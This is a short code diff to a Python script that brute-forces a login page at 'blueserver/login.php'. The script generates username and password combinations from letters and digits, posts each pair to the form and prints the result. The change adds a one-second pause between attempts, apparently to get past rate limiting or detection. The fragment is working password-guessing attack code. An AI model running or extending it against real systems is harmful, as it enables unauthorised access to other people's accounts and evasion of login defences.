@@ -1,6 +1,7 @@
 import requests
 import itertools
 import string
+import time
 
 url = 'https://blueserver/login.php'
 characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
@@ -27,3 +28,6 @@ for username_tuple in usernames:
         response = requests.post(url, data=credentials)
 
         print(f'Attempted {username}:{password}', response)
+
+        time.sleep(1)
+
